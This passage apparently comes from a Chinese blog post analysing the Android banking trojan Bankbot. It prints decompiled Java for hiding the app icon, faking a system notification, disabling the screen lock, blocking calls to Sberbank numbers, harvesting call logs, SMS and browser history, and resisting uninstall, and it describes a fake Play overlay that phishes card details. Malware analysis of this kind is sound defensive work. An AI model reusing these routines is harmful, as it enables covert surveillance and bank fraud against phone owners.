<h3 id="Schedule-服务"><a href="#Schedule-服务" class="headerlink" title="Schedule 服务"></a>Schedule 服务</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    Utils.registerIfNeeded(((Context)<span class="built_in">this</span>));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="built_in">this</span>.getSystemService(<span class="string">&quot;alarm&quot;</span>);</span><br><span class="line">    <span class="type">PendingIntent</span> <span class="variable">v6</span> <span class="operator">=</span> PendingIntent.getBroadcast(((Context)<span class="built_in">this</span>), <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Intent</span>(((Context)<span class="built_in">this</span>), </span><br><span class="line">            NetworkController.class), <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">v7</span> <span class="operator">=</span> FileController.fileExists(((Context)<span class="built_in">this</span>), <span class="string">&quot;interval&quot;</span>) ? Integer.parseInt(FileController</span><br><span class="line">            .readFile(((Context)<span class="built_in">this</span>), <span class="string">&quot;interval&quot;</span>)) : <span class="number">0xA</span>;</span><br><span class="line">    ((AlarmManager)v0).setRepeating(<span class="number">0</span>, System.currentTimeMillis() + <span class="number">0x2710</span>, ((<span class="type">long</span>)(v7 * <span class="number">0x3E8</span>)), </span><br><span class="line">            v6);</span><br><span class="line">    <span class="built_in">this</span>.handleCrashes();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Schedule 服务使用alarm manager 注册一个定时任务。这个定时任务由NetworkController完成。<br>时间间隔由配置文件interval决定。</p>
<p>com.android.market.FileController</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">fileExists</span><span class="params">(Context context, String filename)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), filename).exists();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="隐藏App-图标"><a href="#隐藏App-图标" class="headerlink" title="隐藏App 图标"></a>隐藏App 图标</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">hideApp</span><span class="params">(Context context, <span class="type">boolean</span> hide)</span> &#123;</span><br><span class="line">    <span class="type">ComponentName</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(context.getPackageName(), String.valueOf(context.getPackageName())</span><br><span class="line">             + <span class="string">&quot;.MainActivity&quot;</span>);</span><br><span class="line">    <span class="type">PackageManager</span> <span class="variable">v3</span> <span class="operator">=</span> context.getPackageManager();</span><br><span class="line">    <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> hide ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">    v3.setComponentEnabledSetting(v0, v1, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="伪造的系统Notification"><a href="#伪造的系统Notification" class="headerlink" title="伪造的系统Notification"></a>伪造的系统Notification</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">AppCrash</span>().Register(((Context)<span class="built_in">this</span>));</span><br><span class="line">    <span class="type">Notification</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Notification</span>(<span class="number">0x108008A</span>, <span class="string">&quot;Android system requires user action&quot;</span>, System.</span><br><span class="line">            currentTimeMillis());</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>.getApplicationContext(), AdminX.class);</span><br><span class="line">    v1.setAction(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line">    v1.setFlags(<span class="number">0x34000000</span>);</span><br><span class="line">    v3.setLatestEventInfo(<span class="built_in">this</span>.getBaseContext(), <span class="string">&quot;Android&quot;</span>, <span class="string">&quot;Android system requires action&quot;</span>, PendingIntent</span><br><span class="line">            .getActivity(((Context)<span class="built_in">this</span>), <span class="number">0</span>, v1, <span class="number">0x8000000</span>));</span><br><span class="line">    v3.flags |= <span class="number">0x62</span>;</span><br><span class="line">    <span class="built_in">this</span>.startForeground(<span class="number">2</span>, v3);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Helper</span>(<span class="built_in">this</span>).execute(<span class="keyword">new</span> <span class="title class_">Void</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="禁用屏幕锁定"><a href="#禁用屏幕锁定" class="headerlink" title="禁用屏幕锁定"></a>禁用屏幕锁定</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdminX.<span class="built_in">this</span>.getSystemService(<span class="string">&quot;keyguard&quot;</span>).newKeyguardLock(<span class="string">&quot;ANDROID&quot;</span>).disableKeyguard();</span><br></pre></td></tr></table></figure>

<h3 id="禁止拨打指定号码电话"><a href="#禁止拨打指定号码电话" class="headerlink" title="禁止拨打指定号码电话"></a>禁止拨打指定号码电话</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    String[] v8;</span><br><span class="line">    <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">    <span class="type">String</span> <span class="variable">v6</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v3</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;incoming_number&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v5</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;android.intent.extra.PHONE_NUMBER&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">v11</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">v9</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(action.equals(<span class="string">&quot;android.intent.action.NEW_OUTGOING_CALL&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">v4</span> <span class="operator">=</span> v5.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;#&quot;</span>, <span class="string">&quot;d&quot;</span>).replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;s&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(</span><br><span class="line">                <span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(v1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            v8 = v1.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(v8.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> v13;</span><br><span class="line">                <span class="keyword">for</span>(v13 = <span class="number">0</span>; v13 &lt; v8.length; ++v13) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v4.contains(v8[v13])) &#123;</span><br><span class="line">                        v9 = <span class="number">1</span>;</span><br><span class="line">                        v11 = String.valueOf(v11) + <span class="string">&quot;blocked outgoing call&quot;</span>;</span><br><span class="line">                        <span class="built_in">this</span>.setResultData(<span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v9 == <span class="number">0</span>) &#123;</span><br><span class="line">            v11 = String.valueOf(v11) + <span class="string">&quot;outgoing call&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReportWithDataTask</span>(context, <span class="string">&quot;call_data&quot;</span>).execute(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;[&quot;</span> + <span class="built_in">this</span>.toJSON(v4, </span><br><span class="line">                v11) + <span class="string">&quot;]&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>通过网页 <a target="_blank" rel="noopener" href="http://www.sberbank.com/news-and-media/contacts">http://www.sberbank.com/news-and-media/contacts</a> 中的信息我们可以知道：</p>
<p>8005555550 4955005550 这两个号码 sberbank 的号码，在俄罗斯拨打免费。</p>
<h3 id="禁止接听指定号码电话"><a href="#禁止接听指定号码电话" class="headerlink" title="禁止接听指定号码电话"></a>禁止接听指定号码电话</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((action.equals(<span class="string">&quot;android.intent.action.PHONE_STATE&quot;</span>)) &amp;&amp; (v6.equals(<span class="string">&quot;RINGING&quot;</span>))) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> v3 != <span class="literal">null</span> ? v3.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;#&quot;</span>, <span class="string">&quot;d&quot;</span>).replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;s&quot;</span>).replace(</span><br><span class="line">        <span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) : <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(v10 != <span class="literal">null</span>) &#123;</span><br><span class="line">    v8 = v10.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(v13 = <span class="number">0</span>; v13 &lt; v8.length; ++v13) &#123;</span><br><span class="line">        <span class="keyword">if</span>(v2.contains(v8[v13])) &#123;</span><br><span class="line">            v11 = <span class="string">&quot;blocked incoming call&quot;</span>;</span><br><span class="line">            v9 = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">this</span>.hangUp(context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!v2.contains(<span class="string">&quot;Unknown&quot;</span>)) &#123;</span><br><span class="line">        goto label_106;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v11 = <span class="string">&quot;blocked incoming call&quot;</span>;</span><br><span class="line">    v9 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">this</span>.hangUp(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">label_106:</span><br><span class="line"><span class="keyword">if</span>(v9 == <span class="number">0</span>) &#123;</span><br><span class="line">    v11 = <span class="string">&quot;incoming call&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ReportWithDataTask</span>(context, <span class="string">&quot;call_data&quot;</span>).execute(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;[&quot;</span> + <span class="built_in">this</span>.toJSON(v2, </span><br><span class="line">        v11) + <span class="string">&quot;]&quot;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="隐私窃取"><a href="#隐私窃取" class="headerlink" title="隐私窃取"></a>隐私窃取</h3><h4 id="获取电话拨打记录"><a href="#获取电话拨打记录" class="headerlink" title="获取电话拨打记录"></a>获取电话拨打记录</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> StringBuilder <span class="title function_">getCallLog</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">v20</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v18</span> <span class="operator">=</span> <span class="string">&quot;O||U|T||||G|O|||I|N||G|&quot;</span>.replace(<span class="string">&quot;|&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getContentResolver().query(CallLog$Calls.CONTENT_URI, <span class="literal">null</span>, <span class="literal">null</span>, </span><br><span class="line">            <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v15</span> <span class="operator">=</span> <span class="string">&quot;I++N+C+O+++M+I++N+G+&quot;</span>.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v16</span> <span class="operator">=</span> <span class="string">&quot;M-I--S--S---E--D---&quot;</span>.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v22</span> <span class="operator">=</span> <span class="string">&quot;***&#123;\&quot;n*u**mb**e*r\&quot;***:%s,\&quot;da****te\&quot;:%s,\&quot;d*u*ra****ti*o***n\&quot;:%s,\&quot;t*yp***e\&quot;:%s&#125;*&quot;</span></span><br><span class="line">            .replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((v10.moveToFirst()) &amp;&amp; v10.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v17</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;number&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v21</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v11</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;date&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v14</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;duration&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(!v10.isAfterLast()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">v19</span> <span class="operator">=</span> v10.getString(v17);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v9</span> <span class="operator">=</span> v10.getString(v21);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v7</span> <span class="operator">=</span> v10.getString(v11);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v8</span> <span class="operator">=</span> v10.getString(v14);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v13</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">switch</span>(Integer.parseInt(v9)) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                    v13 = v15;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                    v13 = v18;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">                    v13 = v16;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v20.append(String.format(Locale.US, v22, JSONObject.quote(v19), JSONObject.quote(</span><br><span class="line">                    v7), JSONObject.quote(v8), JSONObject.quote(v13)));</span><br><span class="line">            <span class="keyword">if</span>(!v10.isLast()) &#123;</span><br><span class="line">                v20.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v10.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v10.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v20.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取短信记录"><a href="#获取短信记录" class="headerlink" title="获取短信记录"></a>获取短信记录</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> StringBuilder <span class="title function_">getSmsLog</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getContentResolver().query(Uri.parse(<span class="string">&quot;content://ABC&quot;</span>.replace(<span class="string">&quot;A&quot;</span>, </span><br><span class="line">            <span class="string">&quot;s&quot;</span>).replace(<span class="string">&quot;B&quot;</span>, <span class="string">&quot;m&quot;</span>).replace(<span class="string">&quot;C&quot;</span>, <span class="string">&quot;s&quot;</span>)), <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>((v8.moveToFirst()) &amp;&amp; v8.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(!v8.isAfterLast()) &#123;</span><br><span class="line">            v10.append(String.format(Locale.US, <span class="string">&quot;&#123;\&quot;address\&quot;:%s,\&quot;body\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, </span><br><span class="line">                    JSONObject.quote(v8.getString(v8.getColumnIndex(<span class="string">&quot;address&quot;</span>))), JSONObject</span><br><span class="line">                    .quote(v8.getString(v8.getColumnIndex(<span class="string">&quot;body&quot;</span>))), JSONObject.quote(v8.getString(</span><br><span class="line">                    v8.getColumnIndex(<span class="string">&quot;date&quot;</span>)))));</span><br><span class="line">            <span class="keyword">if</span>(!v8.isLast()) &#123;</span><br><span class="line">                v10.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v8.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v8.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v10.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="浏览器书签"><a href="#浏览器书签" class="headerlink" title="浏览器书签"></a>浏览器书签</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> StringBuilder <span class="title function_">getHistory</span><span class="params">(Uri historyUri)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">v6</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getContentResolver().query(historyUri, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;title&quot;</span>, <span class="string">&quot;url&quot;</span>, </span><br><span class="line">            <span class="string">&quot;date&quot;</span>&#125;, <span class="string">&quot;bookmark = 0&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>((v6.moveToFirst()) &amp;&amp; v6.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(!v6.isAfterLast()) &#123;</span><br><span class="line">            v8.append(String.format(Locale.US, <span class="string">&quot;&#123;\&quot;title\&quot;:%s,\&quot;url\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, JSONObject</span><br><span class="line">                    .quote(v6.getString(v6.getColumnIndex(<span class="string">&quot;title&quot;</span>))), JSONObject.quote(v6.getString(</span><br><span class="line">                    v6.getColumnIndex(<span class="string">&quot;url&quot;</span>))), JSONObject.quote(v6.getString(v6.getColumnIndex(</span><br><span class="line">                    <span class="string">&quot;date&quot;</span>)))));</span><br><span class="line">            <span class="keyword">if</span>(!v6.isLast()) &#123;</span><br><span class="line">                v8.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v6.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v6.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v8.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="骗取信用卡信息"><a href="#骗取信用卡信息" class="headerlink" title="骗取信用卡信息"></a>骗取信用卡信息</h2><p>当用户打开Google Play 应用时，打开伪造的Activity，诱使用户输入信用卡信息。</p>
<h2 id="高级技术"><a href="#高级技术" class="headerlink" title="高级技术"></a>高级技术</h2><h3 id="不断重启的Servcie"><a href="#不断重启的Servcie" class="headerlink" title="不断重启的Servcie"></a>不断重启的Servcie</h3><p>com.android.smali3</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onDestroy();</span><br><span class="line">    <span class="built_in">this</span>.startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>.getApplicationContext(), smali3.class));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务被停止，立即重启，无法停止。</p>
<h3 id="防止卸载"><a href="#防止卸载" class="headerlink" title="防止卸载"></a>防止卸载</h3><p>Bankbot 申请 Device Admin 权限，无法被正常卸载。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb shell pm uninstall com.android.market</span><br><span class="line">Failure</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="禁止删除-Device-Admin-权限"><a href="#禁止删除-Device-Admin-权限" class="headerlink" title="禁止删除 Device Admin 权限"></a>禁止删除 Device Admin 权限</h3><p>这个一个非常流氓的做法，具体的做法是如下面的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdRec</span> <span class="keyword">extends</span> <span class="title class_">DeviceAdminReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AdRec</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> CharSequence <span class="title function_">onDisableRequested</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AppCrash</span>().Register(context);</span><br><span class="line">        <span class="keyword">if</span>(Build$VERSION.SDK_INT &lt;= <span 